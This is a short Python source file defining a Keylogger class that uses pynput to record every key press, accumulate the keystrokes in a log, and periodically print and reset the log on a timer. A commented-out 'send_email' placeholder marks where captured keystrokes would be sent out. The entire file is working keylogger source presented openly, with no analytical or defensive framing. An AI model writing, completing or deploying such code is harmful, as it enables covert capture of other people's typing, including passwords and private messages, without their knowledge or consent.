import pynput, threading

class Keylogger:

    def __init__(self,time_interval):
        print("Constructor "+str(time_interval))
        self.log = "Keylogger started\n\n"
        self.interval = time_interval
        self.report()

    def append_to_log(self,text):
        self.log = self.log + text

    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " +str(key)+ " "
        self.append_to_log(current_key)

    def report(self):
        print(self.log)
        #send_email
        self.log = "Log: "
        self.timer = threading.Timer(5, self.report)
        self.timer.start()

    def start(self):
        with pynput.keyboard.Listener(on_press=self.process_key_press) as listener:
            listener.join()

